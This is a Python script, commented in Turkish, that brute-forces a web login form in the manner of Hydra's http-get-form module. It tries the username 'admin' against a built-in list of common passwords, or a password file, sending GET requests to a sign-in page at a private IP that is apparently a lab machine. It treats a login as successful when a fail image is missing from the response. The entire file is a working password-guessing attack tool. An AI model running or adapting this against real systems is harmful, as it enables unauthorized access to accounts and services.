import requests
import sys
import os

# Hydra mantığı: Tek kullanıcı adı (admin)
USERNAME = "admin"

# Şifre listesi dosyası (opsiyonel)
PASSWORD_FILE = None

# Eğer dosya yoksa, varsayılan şifre listesi
DEFAULT_PASSWORDS = [
    '123456','password','12345678','qwerty','abc123','123456789','111111','1234567',
    'adobe123','123123','admin','1234567890','letmein','photoshop','1234','monkey',
    'shadow','sunshine','password1','princess','azerty','000000','welcome','login',
    'master','hello','freedom','whatever','654321','jordan23','harley','hunter2',
    'password123','zxcvbnm','asdfgh','veronica','buster','123qwe','michelle','scooter',
    'superman','qwerty123','football','1q2w3e4r','1qaz2wsx','zaq1xsw2','xsw2zaq1',
    'welcome1','welcome123','abc123!','admin123','root123','pass123','p@ssw0rd',
    'P@ssw0rd','Qwerty123','admin1','root1','demo123','guest123','user123'
]

# Target URL (IP'yi değiştirmeniz gerekebilir)
TARGET_IP = "192.168.75.128"
TARGET_BASE_URL = f"http://{TARGET_IP}/index.php/signin"

# Yanıtta bu varsa → yanlış giriş (Hydra'daki F= parametresi)
FAIL_INDICATOR = "images/WrongAnswer.gif"


def load_passwords_from_file(filepath):
    """Şifre listesini dosyadan yükle"""
    passwords = []
    try:
        with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
            for line in f:
                password = line.strip()
                if password:  # Boş satırları atla
                    passwords.append(password)
        return passwords
    except FileNotFoundError:
        print(f"❌ Dosya bulunamadı: {filepath}")
        return None
    except Exception as e:
        print(f"❌ Dosya okuma hatası: {e}")
        return None


def try_login(username, password):
    """
    Hydra http-get-form mantığı:
    /index.php:page=signin&username=^USER^&password=^PASS^&Login=Login
    """
    # GET isteği ile query parametreleri URL'de
    params = {
        "page": "signin",
        "username": username,
        "password": password,
        "Login": "Login"
    }
    
    try:
        # GET request (Hydra http-get-form gibi)
        response = requests.get(TARGET_BASE_URL, params=params, timeout=10)
        text = response.text
        
        # Eğer fail indicator yoksa → giriş başarılı
        return FAIL_INDICATOR not in text
    except requests.exceptions.RequestException as e:
        print(f"⚠️  İstek hatası: {e}")
        return False


if __name__ == "__main__":
    # Komut satırı argümanları kontrol et
    if len(sys.argv) > 1:
        PASSWORD_FILE = sys.argv[1]
        passwords = load_passwords_from_file(PASSWORD_FILE)
        if passwords is None:
            print("Varsayılan şifre listesi kullanılıyor...")
            passwords = DEFAULT_PASSWORDS
    else:
        passwords = DEFAULT_PASSWORDS
    
    print(f"[*] Target: {TARGET_IP}")
    print(f"[*] Username: {USERNAME}")
    print(f"[*] Password listesi: {len(passwords)} şifre")
    print(f"[*] Başlatılıyor...\n")
    
    for password in passwords:
        print(f"[-] Trying {USERNAME}:{password}")
        
        ok = try_login(USERNAME, password)
        
        if ok:
            print("\n🎉 GİRİŞ BULUNDU!")
            print(f"Username: {USERNAME}")
            print(f"Password: {password}\n")
            sys.exit(0)
    
    print("\n❌ Hiçbir şifre çalışmadı.")
